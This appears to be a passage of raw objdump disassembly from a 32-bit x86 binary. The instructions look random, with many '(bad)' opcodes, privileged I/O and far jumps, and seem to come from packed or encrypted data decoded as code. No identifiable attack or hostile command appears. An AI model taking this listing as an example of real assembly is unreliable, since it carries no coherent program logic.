  414f69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f6a:	mov    ch,0x57
  414f6c:	or     eax,0xff2a6d2d
  414f71:	mov    cl,0x28
  414f73:	lods   eax,DWORD PTR ds:[esi]
  414f74:	(bad)  
  414f75:	(bad)  
  414f76:	fnstsw WORD PTR [esi+0x64]
  414f79:	std    
  414f7a:	call   0x38e:0xb8b677aa
  414f81:	outs   dx,BYTE PTR ds:[esi]
  414f82:	sbb    eax,0x9d115bb2
  414f87:	pop    edi
  414f88:	sbb    BYTE PTR [ebp-0x5a2fea9c],ch
  414f8e:	and    edx,DWORD PTR gs:[ebp-0x2d]
  414f92:	push   edx
  414f93:	cs sbb al,0xbd
  414f96:	bnd jns 0x414fff
  414f99:	jns    0x414f49
  414f9b:	adc    eax,0x2a3ed1fb
  414fa0:	xlat   BYTE PTR ds:[ebx]
  414fa1:	bound  esi,QWORD PTR [ebp+0x66]
  414fa4:	push   es
  414fa5:	push   0x48
  414fa7:	mov    esp,0x11c114b5
  414fac:	mov    edx,0xa3c26322
  414fb1:	out    dx,eax
  414fb2:	adc    BYTE PTR [ebx],bl
  414fb4:	push   cs
  414fb5:	aam    0x84
  414fb7:	mov    DWORD PTR [ecx],ebp
  414fb9:	arpl   WORD PTR [esi+0x746eaf3e],bp
  414fbf:	sbb    eax,0x99fd2bf6
  414fc4:	push   edx
  414fc5:	mov    esp,fs
  414fc7:	pushf  
  414fc8:	pop    es
  414fc9:	loope  0x414fcc
  414fcb:	cwde   
  414fcc:	push   eax
  414fcd:	push   ebx
  414fce:	je     0x414fd0
  414fd0:	inc    BYTE PTR [edi+0x5ac6465a]
  414fd6:	mov    ds:0xcfb95ff5,al
  414fdb:	jp     0x41501f
  414fdd:	pusha  
  414fde:	loope  0x414fae
  414fe0:	mov    edi,DWORD PTR ds:0xa6994b67
  414fe6:	int3   
  414fe7:	jg     0x414f8d
  414fe9:	add    DWORD PTR [ebp-0x1d35b289],0x9bf9e953
  414ff3:	sub    al,ah
  414ff5:	dec    edx
  414ff6:	jb     0x414fba
  414ff8:	jbe    0x415075
  414ffa:	outs   dx,DWORD PTR ds:[esi]
  414ffb:	push   esp
  414ffc:	jmp    0x78da:0x73498c44
  415003:	ja     0x41500e
  415005:	fisttp QWORD PTR [eax-0x3b]
  415008:	(bad)  
  415009:	xchg   ecx,eax
  41500a:	lock jne 0x415047
  41500d:	jp     0x41504a
  41500f:	lock push edi
  415011:	add    eax,DWORD PTR [ecx]
  415013:	fucomp st(6)
  415015:	sub    dl,BYTE PTR [esi-0x41]
  415018:	and    eax,ebp
  41501a:	xchg   ebp,eax
  41501b:	inc    edx
  41501c:	adc    bl,BYTE PTR [ebx]
  41501e:	add    al,0x4d
  415020:	xchg   ebx,eax
  415021:	xchg   esp,eax
  415022:	or     cl,BYTE PTR [esi+0x16]
  415025:	dec    ebx
  415026:	in     al,0xce
  415028:	(bad)  
  415029:	mov    WORD PTR [ebx-0x706df16f],cs
  41502f:	and    eax,ebp
  415031:	adc    edi,ecx
  415033:	sbb    edi,esp
  415035:	push   esi
  415036:	cmp    al,0xf0
  415038:	mov    al,0x3c
  41503a:	mov    cl,0x16
  41503c:	mov    ecx,0x2ade207b
  415041:	sahf   
  415042:	sub    eax,0xc67c220f
  415047:	sbb    eax,0xe40ecc23
  41504c:	call   0xdd0db3a8
  415051:	scas   al,BYTE PTR es:[edi]
  415052:	loope  0x41501e
  415054:	outs   dx,BYTE PTR ds:[esi]
  415055:	gs daa 
  415057:	mov    cl,0x29
  415059:	out    dx,eax
  41505a:	stc    
  41505b:	adc    al,0x29
  41505d:	out    dx,eax
  41505e:	sahf   
  41505f:	sbb    eax,0xf2521f0b
  415064:	cmp    eax,0x1242fb89
  415069:	(bad)  
  41506a:	imul   ecx,DWORD PTR [esp+edx*2],0xf8901b94
  415071:	cwde   
  415072:	push   ecx
  415073:	jle    0x4150c1
  415075:	and    eax,0x6b3f7108
  41507a:	repz mov ebx,0x9a5b5fb
  415080:	jl     0x415006
  415082:	lods   al,BYTE PTR ds:[esi]
  415083:	adc    bl,BYTE PTR [esi+0x45]
  415086:	pusha  
  415087:	jno    0x41508d
  415089:	and    al,0x9f
  41508b:	retf   0xbac5
  41508e:	inc    esi
  41508f:	aaa    
  415090:	or     bh,BYTE PTR [ecx-0x57f1c227]
  415096:	pushf  
  415097:	dec    ecx
  415098:	test   DWORD PTR [edx-0x4b],ecx
  41509b:	sahf   
  41509c:	(bad)  [esi]
  41509e:	ja     0x4150e2
  4150a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150a1:	test   DWORD PTR [ecx+0x34ab773b],eax
  4150a7:	ins    BYTE PTR es:[edi],dx
  4150a8:	cli    
  4150a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150aa:	dec    ebx
  4150ab:	cdq    
  4150ac:	add    al,dl
  4150ae:	(bad)  
  4150af:	shl    bh,cl
  4150b1:	addr16 retf 
  4150b3:	shr    bh,cl
  4150b5:	jecxz  0x415075
  4150b7:	sub    DWORD PTR [eax],0xdefcf0b3
  4150bd:	loop   0x4150f7
  4150bf:	pushf  
  4150c0:	jo     0x4150ad
  4150c2:	cmp    BYTE PTR [esi],bh
  4150c4:	mov    ds:0xe4e9050b,al
  4150c9:	xor    bh,cl
  4150cb:	jmp    0x580a98e3
  4150d0:	cmp    dh,BYTE PTR [ebx-0x55b4449c]
  4150d6:	sbb    eax,0x4a51f212
  4150db:	adc    ch,BYTE PTR [edi]
  4150dd:	out    dx,al
  4150de:	push   ss
  4150df:	or     BYTE PTR [ebx-0x1e],ah
  4150e2:	jmp    DWORD PTR [eax]
  4150e4:	push   ds
  4150e5:	clc    
  4150e6:	cmc    
  4150e7:	aaa    
  4150e8:	in     al,dx
  4150e9:	and    cl,dh
  4150eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150ec:	dec    esp
  4150ed:	cmp    BYTE PTR [ebx+0x44],ah
  4150f0:	ins    DWORD PTR es:[edi],dx
  4150f1:	cli    
  4150f2:	xchg   ecx,eax
  4150f3:	mov    BYTE PTR [edi],ch
  4150f5:	xchg   esp,eax
  4150f6:	sub    al,0x6a
  4150f8:	mov    esi,DWORD PTR [eax]
  4150fa:	enter  0x6f7,0xa1
  4150fe:	mov    ds:0x7000c3d,al
  415103:	add    al,dh
  415105:	jg     0x41508d
  415107:	daa    
  415108:	push   esp
  415109:	push   edx
  41510a:	out    dx,eax
  41510b:	clc    
  41510c:	loopne 0x4150ab
  41510e:	jb     0x4150e8
  415110:	bound  edi,QWORD PTR ds:0x181cf8f5
  415116:	stos   DWORD PTR es:[edi],eax
  415117:	lods   al,BYTE PTR ds:[esi]
  415118:	jle    0x4150db
  41511a:	mov    bl,0xed
  41511c:	fsub   QWORD PTR [ebp-0x484cc5f1]
  415122:	xchg   ebx,eax
  415123:	mov    ecx,0x82c641dc
  415128:	adc    DWORD PTR [ebx+0x3c],0x78a6098b
  41512f:	mov    ecx,0x6c663af4
  415134:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415135:	lods   eax,DWORD PTR ds:[esi]
  415136:	sub    BYTE PTR [edx-0x25],al
  415139:	test   eax,0x71b9ac12
  41513e:	sti    
  41513f:	dec    edi
  415140:	hlt    
  415141:	sahf   
  415142:	sub    BYTE PTR [ecx-0x5ae3d140],bh
  415148:	(bad)  
  415149:	icebp  
  41514a:	pop    esp
  41514b:	dec    ebx
  41514c:	push   ss
  41514d:	loopne 0x4151c2
  41514f:	pop    ds
  415150:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415151:	inc    ebp
  415152:	mov    cl,0x5f
  415154:	fdivr  st,st(1)
  415156:	fild   WORD PTR [ebp+ebx*2-0x3c438725]
  41515d:	daa    
  41515e:	push   ss
  41515f:	inc    esi
  415160:	push   eax
  415161:	ss dec eax
  415163:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415164:	dec    edx
  415165:	cmp    al,0xc2
  415167:	arpl   ax,dx
  415169:	retf   
  41516a:	mov    edx,0xb7de9e09
  41516f:	inc    ebx
  415170:	cmp    ecx,DWORD PTR [edx-0x2fb24e53]
  415176:	mov    WORD PTR [ebx+0x34],es
  415179:	out    0xab,eax
  41517b:	icebp  
  41517c:	sbb    al,0xaa
  41517e:	mov    bl,0x4b
  415180:	outs   dx,DWORD PTR ds:[esi]
  415181:	sbb    BYTE PTR [ebp+0x7b],ch
  415184:	ror    BYTE PTR [eax+edi*2+0x5e],cl
  415188:	push   esi
  415189:	pusha  
  41518a:	push   0x727f97d2
  41518f:	mov    bl,0xe0
  415191:	fild   DWORD PTR [edx-0x8]
  415194:	hlt    
  415195:	out    dx,al
  415196:	xchg   ebx,eax
  415197:	sbb    BYTE PTR [edi],ch
  415199:	add    ebp,edx
  41519b:	xchg   DWORD PTR [edi],edx
  41519d:	and    bl,0xca
  4151a0:	pushf  
  4151a1:	int    0x98
  4151a3:	dec    ebp
  4151a4:	push   ss
  4151a5:	stc    
  4151a6:	(bad)  
  4151a7:	in     al,dx
  4151a8:	push   DWORD PTR ds:0xc5782805
  4151ae:	mov    esp,0xdded627e
  4151b3:	scas   al,BYTE PTR es:[edi]
  4151b4:	sar    BYTE PTR [eax-0x76a7c142],0x6
  4151bb:	lahf   
  4151bc:	inc    edx
  4151bd:	jne    0x415212
  4151bf:	or     dh,BYTE PTR [edi+0x7c]
  4151c2:	cdq    
  4151c3:	neg    esp
  4151c5:	add    eax,edi
  4151c7:	xor    dl,BYTE PTR [edi]
  4151c9:	jg     0x41516d
  4151cb:	fidivr DWORD PTR [edx+0xdc62580]
  4151d1:	popa   
  4151d2:	cmc    
  4151d3:	adc    al,BYTE PTR [ebp+0x42]
  4151d6:	mov    edi,0x6a030d4c
  4151db:	jle    0x41520c
  4151dd:	outs   dx,DWORD PTR ds:[esi]
  4151de:	rdmsr  
  4151e0:	stos   DWORD PTR es:[edi],eax
  4151e1:	outs   dx,DWORD PTR ds:[esi]
  4151e2:	in     eax,dx
  4151e3:	leave  
  4151e4:	out    dx,eax
  4151e5:	lods   eax,DWORD PTR ds:[esi]
  4151e6:	enter  0x6280,0xf4
  4151ea:	jb     0x415250
  4151ec:	push   ebx
  4151ed:	add    BYTE PTR [ebx],0xa7
  4151f0:	fisub  WORD PTR ds:0xb51f1c89
  4151f6:	adc    eax,0x5df2d77d
  4151fb:	ret    
  4151fc:	and    ah,BYTE PTR [ebx-0x70]
  4151ff:	ss arpl di,si
  415202:	push   0xebaffed5
  415207:	mov    ecx,0xed415fe1
  41520c:	mov    ds:0x5e4ce196,eax
  415211:	ss pop ebp
  415213:	in     al,0xdd
  415215:	jns    0x4151f0
  415217:	xlat   BYTE PTR ds:[ebx]
  415218:	pop    es
  415219:	es in  al,dx
  41521b:	rol    BYTE PTR [eax+0x4e],cl
  41521e:	mov    ecx,0x148b8282
  415223:	push   ebp
  415224:	imul   esp,DWORD PTR [ebx+0x30055f33],0x3d97ce73
  41522e:	mov    ebp,0xf7a6f6ec
  415233:	sub    esp,DWORD PTR [eax+edi*1+0x32]
  415237:	add    al,0x75
  415239:	(bad)  
  41523a:	fidiv  DWORD PTR [eax+0x18]
  41523d:	mov    cs,WORD PTR [ecx-0x39d0526e]
  415243:	fcmovu st,st(4)
  415245:	ja     0x4152b5
  415247:	cli    
  415248:	mov    ss,WORD PTR [esi-0x2952fb5f]
  41524e:	mov    ebx,0xaec109d4
  415253:	std    
  415254:	iret   
  415255:	sbb    al,0xe1
  415257:	fistp  WORD PTR [ecx]
  415259:	lahf   
  41525a:	int3   
  41525b:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41525d:	cld    
  41525e:	add    eax,0x8412d16f
  415263:	xchg   edx,eax
  415264:	and    BYTE PTR [ebp+0x6e],0x8
  415268:	je     0x41522a
  41526a:	dec    eax
  41526b:	mov    esi,0xbe34f4ba
  415270:	or     edx,DWORD PTR [esi+ebp*4]
  415273:	cmp    dl,BYTE PTR [edx]
  415275:	xor    al,0x9e
  415277:	out    0x8d,al
  415279:	xchg   ecx,eax
  41527a:	adc    al,0x20
  41527c:	and    DWORD PTR [eax],edi
  41527e:	retf   
  41527f:	ins    BYTE PTR es:[edi],dx
  415280:	mov    al,0xd
  415282:	push   0x14e796c4
  415287:	call   0x6d4dd616
  41528c:	inc    eax
  41528d:	(bad)  
  41528e:	and    bl,BYTE PTR [edi-0x67716abd]
  415294:	sub    bl,al
  415296:	sahf   
  415297:	ins    BYTE PTR es:[edi],dx
  415298:	add    DWORD PTR [ebx+eiz*8],esp
  41529b:	mov    ah,0x3a
  41529d:	popf   
  41529e:	xor    eax,0x4d1ae594
  4152a3:	and    eax,0xd17416a5
  4152a8:	mov    ds:0x9d8f594b,al
  4152ad:	aaa    
  4152ae:	arpl   WORD PTR [ebp+0x58],di
  4152b1:	cmp    DWORD PTR ds:0x59845849,0x2e
  4152b8:	mov    eax,0xdb79cc81
  4152bd:	xor    al,0x80
  4152bf:	aas    
  4152c0:	add    al,al
  4152c2:	mov    ch,0x4b
  4152c4:	add    eax,0xaf7cecd9
  4152c9:	jnp    0x4152b7
  4152cb:	and    cl,BYTE PTR [ebp+0x25749194]
  4152d1:	pop    ebx
  4152d2:	fild   DWORD PTR [edi]
  4152d4:	pop    es
  4152d5:	push   ss
  4152d6:	dec    esi
  4152d7:	retf   0xfb5
  4152da:	dec    ebx
  4152db:	nop
  4152dc:	xchg   edx,eax
  4152dd:	rol    BYTE PTR [esi],0xad
  4152e0:	mov    edi,0x280ad11
  4152e5:	push   ss
  4152e6:	ins    BYTE PTR es:[edi],dx
  4152e7:	push   es
  4152e8:	dec    eax
  4152e9:	push   0xffffffe6
  4152eb:	adc    al,BYTE PTR [edx+esi*4+0x48ce1bd7]
  4152f2:	mov    cl,0x1c
  4152f4:	sub    esp,DWORD PTR [ecx-0x592cf1f3]
  4152fa:	adc    ebp,DWORD PTR [esi-0x4]
  4152fd:	or     BYTE PTR [edi],ch
  4152ff:	rcl    BYTE PTR [ebp+0x43],0xce
  415303:	inc    esi
  415304:	jle    0x41535b
  415306:	push   0x5c6b6037
  41530b:	mov    al,ds:0xa31cb310
  415310:	cmp    eax,0x46e8501a
  415315:	pop    es
  415316:	pushf  
  415317:	sub    al,0x9
  415319:	pop    eax
  41531a:	pop    edi
  41531b:	sahf   
  41531c:	lds    edi,FWORD PTR [ebp+0x3e93a77f]
  415322:	push   esp
  415323:	imul   ebp,DWORD PTR [ecx+0x39],0x46
  415327:	(bad)  
  415328:	xor    al,bh
  41532a:	fiadd  DWORD PTR [edx]
  41532c:	xchg   DWORD PTR [eax],edx
  41532e:	add    al,0x8f
  415330:	sub    bl,BYTE PTR [edx-0x68]
  415333:	icebp  
  415334:	xchg   esi,eax
  415335:	adc    eax,0xc96c9074
  41533a:	test   ah,cl
  41533c:	call   0x6a79:0x5d4f9d43
  415343:	popf   
  415344:	mov    dh,dh
  415346:	lods   al,BYTE PTR ds:[esi]
  415347:	loopne 0x4153c4
  415349:	test   DWORD PTR [edi-0x40206968],esp
  41534f:	jmp    0x22f:0x238621eb
  415356:	loope  0x41535c
  415358:	in     eax,0x3c
  41535a:	shr    DWORD PTR [esi-0x4b5463e4],0xa
  415361:	xchg   ebx,eax
  415362:	je     0x4153bc
  415364:	gs nop
  415366:	jno    0x415310
  415368:	pop    ss
  415369:	loop   0x41530e
  41536b:	mov    edi,0x2f975462
  415370:	out    0x32,al
  415372:	lods   al,BYTE PTR ds:[esi]
  415373:	fmul   QWORD PTR [ebx+0x62]
  415376:	sbb    al,0xa
  415378:	clc    
  415379:	imul   esi,DWORD PTR [edx+ebp*8+0x31],0x59
  41537e:	push   es
  41537f:	sbb    ah,ah
  415381:	jae    0x4153fa
  415383:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415384:	push   edi
  415385:	jnp    0x41539d
  415387:	fs xor ebp,0xffffffef
  41538b:	sub    ch,bh
  41538d:	in     eax,dx
  41538e:	repnz nop
  415390:	xchg   esp,eax
  415391:	and    esp,edx
  415393:	shl    DWORD PTR [edx],1
  415395:	in     al,dx
  415396:	rol    DWORD PTR [ebx+esi*2-0x4e157fb6],1
  41539d:	jmp    0x77e2:0x393d022
  4153a4:	sub    ah,BYTE PTR [ecx]
  4153a6:	in     al,0xbb
  4153a8:	out    dx,eax
  4153a9:	scas   eax,DWORD PTR es:[edi]
  4153aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153ab:	xchg   ebx,eax
  4153ac:	sahf   
  4153ad:	fsub   QWORD PTR [eax+0x35152cbf]
  4153b3:	mov    ds:0xd9c96b30,eax
  4153b8:	popa   
  4153b9:	fisttp QWORD PTR [ecx+0x4c]
  4153bc:	or     eax,0xa28b9c75
  4153c1:	cs cmp al,0x6b
  4153c4:	push   ss
  4153c5:	pop    edx
  4153c6:	adc    al,al
  4153c8:	outs   dx,BYTE PTR ds:[esi]
  4153c9:	rcr    DWORD PTR [esi-0x6e],0xb
  4153cd:	cld    
  4153ce:	pop    eax
  4153cf:	add    ah,BYTE PTR [ecx]
  4153d1:	cmp    DWORD PTR [ecx+edi*1-0x7],0x8e96b16
  4153d9:	fcmovb st,st(0)
  4153db:	nop
  4153dc:	test   al,0x70
  4153de:	and    DWORD PTR [ecx-0x27],ebp
  4153e1:	leave  
  4153e2:	int    0x51
  4153e4:	adc    al,0x65
  4153e6:	and    DWORD PTR [esi],ecx
  4153e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153e9:	repz push ds
  4153eb:	lds    eax,FWORD PTR [esi]
  4153ed:	pop    edi
  4153ee:	les    eax,FWORD PTR [edx-0x5f6231dc]
  4153f4:	sti    
  4153f5:	iret   
  4153f6:	icebp  
  4153f7:	div    ebx
  4153f9:	jle    0x4153a5
  4153fb:	xor    dh,ch
  4153fd:	add    DWORD PTR [ecx+eax*1+0x44883ef7],ebx
  415404:	addr16 pop ds
  415406:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415407:	retf   0x3531
  41540a:	es aad 0xc9
  41540d:	push   ecx
  41540e:	test   al,0x17
  415410:	aam    0x8b
  415412:	(bad)  
  415413:	ds push eax
  415415:	sub    bl,BYTE PTR [eax]
  415417:	adc    bl,dl
  415419:	sub    ebp,esp
  41541b:	(bad)  
  41541c:	mov    ebx,0xd53f4c8a
  415421:	mov    ds:0x38009439,eax
  415426:	jns    0x415451
  415428:	imul   ebx,DWORD PTR [edi-0x2f],0xe89e2477
  41542f:	sub    eax,0x57f60b10
  415434:	stos   DWORD PTR es:[edi],eax
  415435:	inc    eax
  415436:	or     DWORD PTR [edi],edx
  415438:	in     eax,dx
  415439:	adc    eax,0xc60d6e0f
  41543e:	mov    bl,0xe4
  415440:	rcr    esi,1
  415442:	fxch   st(6)
  415444:	enter  0x240f,0xcf
  415448:	mov    edi,0x24f140c9
  41544d:	push   esi
  41544e:	mov    ds:0x66ee977e,eax
  415453:	test   ebx,eax
  415455:	sbb    cl,ch
  415457:	pop    edi
  415458:	out    dx,al
  415459:	xlat   BYTE PTR gs:[ebx]
  41545b:	jo     0x415406
  41545d:	push   eax
  41545e:	cld    
  41545f:	pusha  
  415460:	jno    0x4154a6
  415462:	std    
  415463:	push   esp
  415464:	scas   al,BYTE PTR es:[edi]
  415465:	xchg   DWORD PTR [edi+0x45e66ade],edi
  41546b:	popf   
  41546c:	shr    DWORD PTR [ecx+0x3b7fe2cd],1
  415472:	imul   eax,DWORD PTR [eax+0x44],0xfffffff5
  415476:	jbe    0x41549b
  415478:	mov    DWORD PTR [esi],esp
  41547a:	mov    ebp,0xe215e12b
  41547f:	iret   
  415480:	xchg   edx,eax
  415481:	cwde   
  415482:	clc    
  415483:	cmp    ebp,edx
  415485:	push   ebp
  415486:	pop    ebx
  415487:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415488:	jp     0x4154e1
  41548a:	sub    ah,dl
  41548c:	xor    al,ah
  41548e:	ret    0x6791
  415491:	push   edx
  415492:	jno    0x41548d
  415494:	gs pop eax
  415496:	push   edi
	...
  415513:	add    BYTE PTR [edi-0x5c],ch
  415516:	daa    
  415517:	jbe    0x415508
  415519:	idiv   DWORD PTR [edi-0x43]
  41551c:	mov    ecx,0x8e16f8af
  415521:	and    cl,BYTE PTR [eax+0x53]
  415524:	test   edx,edi
  415526:	add    BYTE PTR [eax],al
  415528:	imul   eax,DWORD PTR [edi],0x0
  41552b:	add    BYTE PTR [ebx-0x43],al
  41552e:	jnp    0x415509
  415530:	inc    eax
  415531:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415532:	mov    eax,0x49d110ec
  415537:	dec    ebx
  415538:	(bad)  
  415539:	daa    
  41553a:	xchg   edx,edx
  41553c:	(bad)  
  41553d:	and    ecx,edx
  41553f:	xchg   esi,eax
  415540:	call   FWORD PTR [esi+0xf442be9]
  415546:	cwde   
  415547:	js     0x41554c
  415549:	ja     0x41552e
  41554b:	lods   eax,DWORD PTR ds:[esi]
  41554c:	rcr    DWORD PTR [esi+ebp*8-0x1e1a9334],0x95
  415554:	mov    WORD PTR [edi+0x4eae99d6],cs
  41555a:	inc    edi
  41555b:	push   ebp
  41555c:	inc    edi
  41555d:	sbb    DWORD PTR [edx+0x75],esi
  415560:	popa   
  415561:	aas    
  415562:	mov    ds:0xa71a714a,al
  415567:	and    ebp,eax
  415569:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41556a:	nop
  41556b:	or     bl,BYTE PTR [edi+0x54]
  41556e:	rcl    ebx,1
  415570:	push   eax
  415571:	les    ecx,FWORD PTR [esi+0x35]
  415574:	aas    
  415575:	int    0xe2
  415577:	aad    0xd
  415579:	test   eax,0x96f8f1ae
  41557e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415580:	mov    ebx,esp
  415582:	push   ebp
  415583:	sbb    al,0x4c
  415585:	xor    al,0x8d
  415587:	mov    ch,0x56
  415589:	xor    DWORD PTR [eax+0x22],esp
  41558c:	jge    0x415595
  41558e:	push   esi
  41558f:	test   BYTE PTR [esi],cl
  415591:	pop    ss
  415592:	xchg   ebp,eax
  415593:	inc    ebp
  415594:	fcmovnu st,st(7)
  415596:	and    BYTE PTR [ebp-0x4d],ch
  415599:	inc    edi
  41559a:	fld    DWORD PTR [eax-0x1d1358f8]
  4155a0:	retf   
  4155a1:	rcl    dh,1
  4155a3:	jbe    0x4155c5
  4155a5:	retf   
  4155a6:	mov    ch,0xdf
  4155a8:	out    0x8c,al
  4155aa:	cmp    eax,0xaecae82d
  4155af:	dec    ebp
  4155b0:	dec    esp
  4155b1:	or     DWORD PTR [ebx+esi*8],ebp
  4155b4:	retf   
  4155b5:	shr    ebx,0x70
  4155b8:	fmul   QWORD PTR [ebx-0x57e248d2]
  4155be:	in     al,dx
  4155bf:	cmp    eax,0x899ec97c
  4155c4:	pushf  
  4155c5:	ss dec ebp
  4155c7:	pop    es
  4155c8:	pushf  
  4155c9:	sbb    al,0xd0
  4155cb:	repz inc ebp
  4155cd:	sub    eax,0x7da28b7d
  4155d2:	std    
  4155d3:	cmp    al,0x29
  4155d5:	bound  ebp,QWORD PTR [edi+0x76]
  4155d8:	fucomip st,st(3)
  4155da:	fs pop es
  4155dc:	sub    ebx,0x377856c0
  4155e2:	jmp    0x415620
  4155e4:	outs   dx,DWORD PTR ds:[esi]
  4155e5:	imul   eax,DWORD PTR [eax-0x2f],0xffffffe0
  4155e9:	pop    ecx
  4155ea:	dec    ecx
  4155eb:	push   edx
  4155ec:	pushf  
  4155ed:	jae    0x415571
  4155ef:	sbb    DWORD PTR [edx-0x2a3d8f99],edx
  4155f5:	add    BYTE PTR [ebp+0x1b],al
  4155f8:	jl     0x415599
  4155fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155fb:	pop    ebx
  4155fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155fd:	repnz or ecx,esi
  415600:	mov    ecx,0x9fa10e3e
  415605:	cli    
  415606:	lods   al,BYTE PTR ds:[esi]
  415607:	test   BYTE PTR [eax+eax*4-0x3],ah
  41560b:	mov    dh,0x95
  41560d:	inc    edi
  41560e:	push   edx
  41560f:	cmp    eax,0x5e01231c
  415614:	and    BYTE PTR [ecx-0x7f],0xf8
  415618:	cmp    al,BYTE PTR [edi+0x52f1d477]
  41561e:	idiv   DWORD PTR [edx]
  415620:	inc    esi
  415621:	fmul   st(4),st
  415623:	pusha  
  415624:	jne    0x4155fa
  415626:	dec    ebx
  415627:	test   eax,0x6494fcc8
  41562c:	in     eax,0xdf
  41562e:	ja     0x415604
  415630:	dec    edi
  415631:	cs push eax
  415633:	inc    edx
  415634:	or     DWORD PTR [edx+0x64],ecx
  415637:	fdiv   QWORD PTR [edi]
  415639:	mov    BYTE PTR [edx+edi*1-0x75f9d302],bh
  415640:	xchg   DWORD PTR [esi-0x22],edi
  415643:	or     al,0xa1
  415645:	stos   DWORD PTR es:[edi],eax
  415646:	add    eax,0x1763f433
  41564b:	inc    ecx
  41564c:	adc    edx,esi
  41564e:	out    0x45,eax
  415650:	and    DWORD PTR [eax-0x11fd1ae1],ecx
  415656:	lahf   
  415657:	pop    ebp
  415658:	leave  
  415659:	jnp    0x415626
  41565b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41565c:	in     eax,0xa8
  41565e:	ja     0x41560b
  415660:	daa    
  415661:	fstp   DWORD PTR [edx-0x1022d697]
  415667:	cmp    DWORD PTR [ecx],eax
  415669:	push   ds
  41566a:	dec    ecx
  41566b:	(bad)  
  41566c:	loop   0x4156af
  41566e:	mov    ebp,0xf34ffc92
  415673:	inc    eax
  415674:	mov    esi,0x5405386a
  415679:	pop    es
  41567a:	jge    0x4156a4
  41567c:	pusha  
  41567d:	inc    esi
  41567e:	inc    esi
  41567f:	mov    esp,0xd99af125
  415684:	div    DWORD PTR [esi+edi*2]
  415687:	js     0x415640
  415689:	inc    esi
  41568a:	imul   edi,DWORD PTR [esi],0x7e
  41568d:	xchg   ebx,esp
  41568f:	ror    DWORD PTR [ebx+0x2d2b5ef0],1
  415695:	mov    eax,ds:0x76f3f5f3
  41569a:	cmp    ecx,DWORD PTR [esi-0x63]
  41569d:	jmp    0x5d4d:0xf88378fa
  4156a4:	pop    ds
  4156a5:	(bad)  ds:0x6ac09024
  4156ab:	fild   QWORD PTR [edx+ecx*4+0x20]
  4156af:	hlt    
  4156b0:	and    al,0xc5
  4156b2:	ins    BYTE PTR es:[edi],dx
  4156b3:	hlt    
  4156b4:	das    
  4156b5:	push   ss
  4156b6:	mov    bl,BYTE PTR [eax]
  4156b8:	and    al,0x6e
  4156ba:	sub    esp,edx
  4156bc:	call   0x65f3:0x303d0694
  4156c3:	scas   eax,DWORD PTR es:[edi]
  4156c4:	xchg   ecx,eax
  4156c5:	(bad)  
  4156c6:	loopne 0x415668
  4156c8:	loope  0x41566f
  4156ca:	jmp    0x415651
  4156cc:	adc    DWORD PTR [esi-0x6916ff44],edx
  4156d2:	shl    DWORD PTR [edx+ecx*8],1
  4156d5:	in     eax,dx
  4156d6:	and    ch,BYTE PTR [ebx+0xb3ccbe1]
  4156dc:	jmp    0x3c2b:0x3eb077cb
  4156e3:	mov    ch,0xac
  4156e5:	jo     0x415724
  4156e7:	dec    ebx
  4156e8:	pop    es
  4156e9:	mov    al,ds:0x4ae9a05
  4156ee:	ror    BYTE PTR [ebp-0x425084d0],0x43
  4156f5:	inc    ecx
  4156f6:	lahf   
  4156f7:	jmp    0x415723
  4156f9:	sbb    eax,0xe7e9b7b9
  4156fe:	jo     0x41575d
  415700:	stos   BYTE PTR es:[edi],al
  415701:	push   ebx
  415702:	loop   0x4156ce
  415704:	add    eax,0x3f8932e8
  415709:	mov    esp,0x41bdb965
  41570e:	neg    DWORD PTR [ecx-0x22]
  415711:	nop
  415712:	mov    eax,ds:0x56d8adc0
  415717:	pop    ecx
  415718:	xor    al,0x4e
  41571a:	jmp    0x4156d9
  41571c:	enter  0x3b09,0xd7
  415720:	mov    WORD PTR [ecx+eax*1-0x79],es
  415724:	mov    ah,0x89
  415726:	xchg   ebp,eax
  415727:	add    eax,0xae07c65b
  41572c:	into   
  41572d:	cmp    BYTE PTR [edi+0x19],bl
  415730:	pop    edi
  415731:	xchg   esp,eax
  415732:	mov    esi,0xd9c420c2
  415737:	iret   
  415738:	and    ebp,ebp
  41573a:	xchg   edi,eax
  41573b:	xchg   edi,eax
  41573c:	jb     0x4156e8
  41573e:	mov    ebx,fs
  415740:	nop
  415741:	or     eax,0x7920ad36
  415746:	jae    0x415748
  415748:	(bad)  
  415749:	les    edi,FWORD PTR ss:[ebx+0x7bdd5a]
  415750:	xor    esp,DWORD PTR [edx]
  415752:	xor    BYTE PTR [edi],bl
  415754:	sub    eax,0xb37e9511
  415759:	pop    esi
  41575a:	mov    bl,0x94
  41575c:	jmp    0x575c:0x1e180f84
  415763:	dec    edx
  415764:	pop    eax
  415765:	(bad)  
  415766:	fcmovnb st,st(4)
  415768:	in     al,0x99
  41576a:	xchg   edx,eax
  41576b:	loopne 0x415706
  41576d:	adc    edx,esi
  41576f:	or     ebp,ecx
  415771:	mov    esp,0xb898563d
  415776:	inc    ebp
  415777:	push   edx
  415778:	xor    al,0x6a
  41577a:	imul   ebp
  41577c:	fisubr DWORD PTR [esi]
  41577e:	xor    eax,0x7d77e663
  415783:	pop    esp
  415784:	mov    ebp,0x5ea3cdbb
  415789:	sbb    al,0x79
  41578b:	pop    ds
  41578c:	pop    ds
  41578d:	or     dl,BYTE PTR [eax-0x53]
  415790:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  415792:	xchg   ebx,eax
